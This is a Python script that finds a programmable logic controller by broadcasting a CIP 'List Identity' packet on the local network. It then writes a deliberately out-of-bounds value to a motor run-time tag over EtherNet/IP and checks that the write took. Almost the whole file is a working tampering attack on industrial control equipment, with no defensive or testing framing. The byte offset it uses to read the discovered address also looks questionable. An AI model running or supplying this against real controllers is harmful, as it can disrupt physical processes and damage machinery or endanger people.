import pycomm3
import socket
import struct
import time

# Define the tag name to modify (replace with the actual tag name in your PLC)
TAG_TO_MODIFY = "MotorRunTime"  # Example: Motor run time in seconds
# Define the out-of-bounds value to write
OUT_OF_BOUNDS_VALUE = 99999  # Example: An extremely long run time (seconds)
# Set the PLC address, it will be updated by the get_plc_ip function
PLC_IP_ADDRESS = None

# Function to discover the PLC's IP address
def get_plc_ip():
    """
    Discovers the PLC's IP address on the network using CIP discovery.

    Returns:
        str: The IP address of the PLC, or None if not found.
    """
    try:
        # Craft a CIP request to find all devices
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)  # Set a timeout of 5 seconds

        # CIP "List Identity" request packet
        packet = b"\x63\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        # Broadcast the packet to the local network
        sock.sendto(packet, ('<broadcast>', 44818)) #CIP Port

        # Listen for responses
        while True:
            try:
                data, addr = sock.recvfrom(1024)  # Increased buffer size
                # The IP address is in bytes 26-29 of the response
                ip_address_bytes = data[26:30]
                ip_address = socket.inet_ntoa(ip_address_bytes)
                print(f"Found PLC at IP address: {ip_address}")
                sock.close()
                return ip_address
            except socket.timeout:
                print("No PLCs found on the network.")
                sock.close()
                return None  # No PLC found
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None

# Function to modify the PLC tag
def modify_plc_tag(plc_ip, tag_name, new_value):
    """
    Modifies a tag in the PLC with a new value using pycomm3.

    Args:
        plc_ip (str): The IP address of the PLC.
        tag_name (str): The name of the tag to modify.
        new_value (any): The new value to write to the tag.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            print(f"Connecting to PLC at {plc_ip}...")
            # Read the tag before modifying to see it's type
            read_response = plc.read(tag_name)

            if read_response.status == 'Success':
                data_type = type(read_response.value)
                print(f"Tag '{tag_name}' current value is: {read_response.value}")

                # Try converting the new value to match the tag's data type
                try:
                    converted_value = data_type(new_value)  # Attempt to convert the value
                except ValueError:
                    print(f"Error: Cannot convert '{new_value}' to the required data type: {data_type}")
                    return

                # Write the new value to the tag
                write_response = plc.write(tag_name, converted_value)

                if write_response.status == 'Success':
                    print(f"Successfully wrote value '{converted_value}' to tag '{tag_name}'")
                    # Verify the change by reading the tag again
                    verify_response = plc.read(tag_name)
                    if verify_response.status == 'Success':
                        print(f"Tag '{tag_name}' new value is: {verify_response.value}")
                        if verify_response.value == converted_value:
                            print("Verification successful: Value written correctly.")
                        else:
                            print("Verification failed: Value mismatch.")
                    else:
                        print(f"Error verifying tag '{tag_name}': {verify_response.status}")

                else:
                    print(f"Error writing to tag '{tag_name}': {write_response.status}")
            else:
                print(f"Error reading tag '{tag_name}': {read_response.status}")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Discover PLC IP address
    PLC_IP_ADDRESS = get_plc_ip()
    if PLC_IP_ADDRESS is None:
        print("PLC IP address not found.  Exiting.")
    else:
        # Modify the tag
        modify_plc_tag(PLC_IP_ADDRESS, TAG_TO_MODIFY, OUT_OF_BOUNDS_VALUE)